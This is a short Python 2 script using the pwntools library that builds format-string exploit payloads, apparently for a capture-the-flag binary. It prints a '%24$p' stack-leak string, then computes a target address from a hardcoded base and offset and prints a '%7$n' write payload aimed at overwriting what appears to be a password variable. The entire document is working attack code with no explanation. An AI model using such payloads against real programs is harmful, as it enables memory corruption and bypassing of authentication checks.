from pwn import *
print '%24$p'
base = 0x0000555555554700
addr_pw = base+2103616
print 'aaaa%7$n'+p64(addr_pw)